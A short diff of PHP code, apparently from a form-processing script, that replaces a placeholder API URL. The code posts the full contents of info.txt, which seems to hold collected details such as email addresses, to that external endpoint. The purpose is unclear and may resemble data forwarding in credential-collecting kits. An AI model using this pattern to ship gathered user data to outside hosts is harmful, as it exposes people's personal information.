@@ -102,7 +102,7 @@ email: ".$files->email."\n\n Thank's";
         $file = file_get_contents('info.txt');
 
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, 'yourapi');
+        curl_setopt($ch, CURLOPT_URL, '<YOUR API>');
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, 'data='.$file);
         $x = curl_exec($ch);
